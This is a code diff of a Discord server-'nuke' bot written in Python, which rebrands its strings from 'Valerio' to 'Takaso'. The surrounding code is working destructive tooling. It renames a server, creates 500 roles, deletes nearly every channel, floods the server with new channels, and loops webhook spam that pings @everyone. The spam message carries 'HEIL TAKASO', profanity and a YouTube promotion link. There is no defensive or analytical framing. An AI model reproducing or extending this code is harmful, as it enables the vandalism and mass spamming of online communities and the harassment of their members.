@@ -147,7 +147,7 @@ async def nuke(ctx):
         pass
     guild = ctx.guild
     try:
-        await guild.edit(name="Valerio")
+        await guild.edit(name="Nuked by Takaso | Sub to my YT")
     except:
         pass
     try:
@@ -214,14 +214,14 @@ async def deleteroles(ctx):
 async def rolenuke(ctx):
     for x in range(500):
         try:
-            await ctx.guild.create_role(name="Valerio")
+            await ctx.guild.create_role(name="Nuked by Takaso")
         except:
             pass
 
 @slayer.command()
 async def lastcheck(ctx):
     for channel in ctx.guild.channels:
-        if channel.name != "valerio":
+        if channel.name != "heil-takaso":
             try:
                 await channel.delete()
             except:
@@ -409,7 +409,7 @@ tipi = ["0", "2"]
 
 def chanflood():
     payload = {
-        "name": "valerio",
+        "name": "heil-takaso",
         "type": random.choice(tipi)
     }
     try:
@@ -430,10 +430,10 @@ def threadchan():
 async def on_guild_channel_create(channel):
   global checkweb
   if checkweb == True:
-      webhook = await channel.create_webhook(name="Valerio")
+      webhook = await channel.create_webhook(name="Takaso")
       try:
           while True:
-              await webhook.send(content=":valerio:\n@everyone")
+              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
       except:
           pass
 
